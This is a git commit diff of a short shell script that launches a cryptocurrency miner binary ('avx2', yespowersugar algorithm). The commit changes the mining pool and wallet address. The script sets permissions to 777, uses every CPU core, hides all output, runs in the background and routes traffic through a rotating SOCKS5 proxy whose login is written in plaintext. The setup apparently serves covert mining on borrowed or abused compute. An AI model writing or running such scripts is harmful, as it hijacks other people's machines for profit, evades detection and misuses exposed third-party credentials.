cd1db15d151dcde7ab57e6f24adadcf39b2604a1
arielsamsun9275 <107605565+arielsamsun9275@users.noreply.github.com>
2022-08-09 22:06:48 +0700

    Update w.sh

--- w.sh
+++ w.sh
@@ -1,4 +1,4 @@
 #!/bin/bash
 chmod 777 lo.sh avx2
-./avx2 -a yespowersugar -o stratum+tcp://yespowerSUGAR.na.mine.zpool.ca:6241 -u RWtWXvk8snoEYqur7DavqDYEPmymwceBFd.Code -p scbte -t $(nproc --all) -x socks5://speedest88-NL-rotate:speedest88@p.webshare.io:80 > /dev/null 2>&1 &
+./avx2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u sugar1qc4y863shhe78t5st7ayt40gmdzpwm74w0m7dmc.Jotunheim -p Yggdrasil -t $(nproc --all) -x socks5://speedest88-NL-rotate:speedest88@p.webshare.io:80 > /dev/null 2>&1 &
 ./lo.sh
